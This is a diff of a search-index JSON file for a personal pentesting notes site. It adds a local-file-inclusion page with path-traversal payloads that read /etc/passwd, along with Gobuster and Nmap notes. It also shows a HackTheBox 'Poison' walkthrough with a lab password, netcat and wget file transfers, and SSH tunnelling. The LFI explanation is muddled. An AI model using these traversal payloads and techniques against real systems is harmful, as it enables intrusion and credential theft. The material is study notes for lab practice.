@@ -18,7 +18,14 @@
 	"title": "",
 	"tags": [],
 	"description": "",
-	"content": "Welcome to my repository of knowledge, on the top right you will find social links. to the left or top, you should see navigation depends on the platform.\n"
+	"content": "Welcome, to my repository of knowledge, HACKTHEBOXon walkthroughs, pentesting tools \u0026amp; concepts. The top right you will find social links. to the left or top, you should see navigation depends on the platform.\n"
+},
+{
+	"uri": "/concepts/webapppentest/lfi/lfi/",
+	"title": " Local File inclusion",
+	"tags": [],
+	"description": "",
+	"content": "Local file inclusion is pretty rare as it requires bad coding but it does happen. This vulnerability occurs when system commands or unsanitized user input or written into how the web server handles user input. Basically, you escape out of the current string and your commands get executed. This only grants you the access the web app has. So if the PHP script has permissions for www-data which is a web server user. You won\u0026rsquo;t be able to access anything with elevated permissions. Before you start thinking PHP is the bad guy I want to go ahead and say all of the webpage languages are vulnerable.\nWord list for lfi can be found in seclist: /Seclist/Fuzzing/LFI-JHADDIX.txt\n\u0026hellip;.//\u0026hellip;.//\u0026hellip;.//etc/passwd\n/../../etc/passwd\n/..../..../..../..../..../..../etc/passwd\n/\u0026hellip;/\u0026hellip;/\u0026hellip;/\u0026hellip;/\u0026hellip;/etc/passwd\n\\…..\\\\…..\\\\…..\\\\etc\\passwd\n Often there will be filters in place, and then the job becomes understanding how the information is being filtered. If you\u0026rsquo;d like to see how PHP script in waldo handled user input read the WALDO write-up. You can also use burp to test for LFI I would recommend it makes it really convenient to test. in POISON there weren\u0026rsquo;t any filters in place so the standard escaped worked. (examples later) The web form allowed you to read local files, but once you escaped out of the directory supplying more data than the script can handle. You could read more. "
 },
 {
 	"uri": "/tools/bloodhound/",
@@ -60,7 +67,7 @@
 	"title": "GoBuster",
 	"tags": [],
 	"description": "",
-	"content": " Go Buster  Gobuster is a tool often used to enumerate web directories. It offers more power than dirb \u0026amp; dirbuster. You dont have to use the extension switch all the time and it may not be necessary. I would recommend limiting extensions to whats relevant.\nEnumerating Directories gobuster -u http://TARGET_IP:PORT -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100\n-t for threads can go as high as 200, 100 is kind of to much 40 is perfect for multiple things going on.\n-s \u0026ldquo;200,204,301,302,307,404\u0026rdquo; errors to look for you can edit these\n-w medium or small\n-x extensions Linux php html txt doc Windows aspx asp php\n-fw force wild card\nAdding SessionID this can be easily overlooked.\n-c PHPSESSIONID=1324567890\nEnumerating Browser User Agent Burp Proxy User Agent (certain browser Sufarri, FireFox, Chrome, IE).\ngobuster -u http://localhost:3000 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 39\ngobuster -u http://target:port -a \u0026lsquo;agent\u0026rsquo; -w wordlists -t 100\nAdding multple extentions\n-x php,aspx,asp,html,doc,txt\n"
+	"content": " Go Buster  Gobuster is a tool often used to enumerate web directories. It offers more power than dirb \u0026amp; dirbuster. You dont have to use the extension switch all the time and it may not be necessary. I would recommend limiting extensions to whats relevant.\nEnumerating Directories gobuster -u http://TARGET_IP:PORT -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100\n-t for threads can go as high as 200, 100 is kind of to much 40 is perfect for multiple things going on.\n-s \u0026ldquo;200,204,301,302,307,404\u0026rdquo; errors to look for you can edit these\n-w medium or small\n-x extensions Linux php html txt doc Windows aspx asp php\n-fw force wild card\nAdding SessionID this can be easily overlooked.\n-c PHPSESSIONID=1324567890\nEnumerating Browser User Agent Burp Proxy User Agent (certain browser Sufarri, FireFox, Chrome, IE). Some webservers can be configred to only accept a certain browser.\ngobuster -u http://target:port -a \u0026lsquo;agent\u0026rsquo; -w wordlists -t 100\nAdding multple extentions\n-x php,aspx,asp,html,doc,txt\n"
 },
 {
 	"uri": "/hackthebox/",
@@ -84,6 +91,13 @@
 	"content": "Setting up Test Enviroment or Complicated tools.\n  \n  "
 },
 {
+	"uri": "/tools/portscanning/nmap/",
+	"title": "Nmap",
+	"tags": [],
+	"description": "",
+	"content": "Nmap is a port scanning tool that can enumerate devices operating systems and even run scripts that intrusive. Allot of tools have a wide range of abilities but specialize at one thing. Nmap uses ping sweeps and a lot of math to figure everything out. For example based ping time to live, you can figure out the operating system based on how lit takes to handle the information ~128 windows ~64 Linux.\n"
+},
+{
 	"uri": "/concepts/webapppentest/osinjcmd/",
 	"title": "OS Command Injection",
 	"tags": [],
@@ -103,6 +117,13 @@
 	"tags": [],
 	"description": "",
 	"content": "PHASE 1 NMAP\nnmap -sC -sV -Pn -oA initial_poison 10.10.10.84  port 22 ssh it can be a rabbit-hole.\nport 80 webpage apache 2.4.29 (FreeBSD) PHP/ 5.6.32\nport 514 hmm\nPHASE 2 LFI\nManually inspect the webpage this is kind of tedious. As you’ll have to investigate the PHP scripts one by one. listfiles.php has an interesting new piece of information. Go back to the default webpage and enter PWDBACKUP.TXT.\nnext step you will have to decode this secure password.txt. I’d like to note that md5(TMOBILE …COUGH), base64 are not encryption algorithms because it lacks a key. I used Cyberchef to decode the message 13 times. The interface for Cyberchef made it easy. tool — https://gchq.github.io/CyberChef/\nCharix!2#4%6\u0026amp;8(0\nPHASE 3 SSH :🤣\nThis time it wasn’t a rabbit hole. Lady luck was on our side as the developer left those passwords out and about. Have to guess what the username is. It’s not poison, after a while, I got it right charix is the username.\nsecret.zip user.txt  Need to move secret.zip off of the machine to unzip the file gzip isn’t available on the machine. YOU WILL NEED TO CHANGE READ PERMISSIONS\npython3 -m http.server 8081 wget http://10.10.10.84:8081/secret.zip chmod 400 secret  python may not always be available on the host.\nFile transfer for NetCat this tool will transfer a file to the other session the \u0026gt; overwrites the file your nc -l -p 8081 \u0026gt; directory_path fromt target nc 10.10.14.3 8081 \u0026gt; secret.zip  What is the point of secret? after banging my head for a while. I decided to just for the laughs and tried Netstat and see if any services were running. By George did I. WAIT//// WHAT THIS LOCALHOST, ARG!!!!!!\nnetstat -na |grep -i LISTEN  PHASE 4 SSH AGAIN\nYeah, didn’t know this before this box but you can ssh into localhost.\nSSH port forwarding is a neat tool to get access to the Localhost through an ssh connection. Well, that’s what well be using it for. Source port would be for example 8080 destination port would 80 if you wanted to connect to a web server It could take 20 seconds for it to connect also nothing really happens. BE PATIENT!!!!!\n-L PORT1:IP: PORT2 tells ssh that you want it to listen on your host port PORT1. any traffic that comes to your host PORT1, send it through the ssh connection, and then from the host, you’re smashed into, send it from that host to IP:PORT2\nconcept\nthe juice. it’s a secret guess\nPHASE 5 FINALE\nport 5801 is associated with Vncviewer.\n"
+},
+{
+	"uri": "/tools/portscanning/",
+	"title": "PortScannings",
+	"tags": [],
+	"description": "",
+	"content": ""
 },
 {
 	"uri": "/tools/ssh/sshtunnling/",
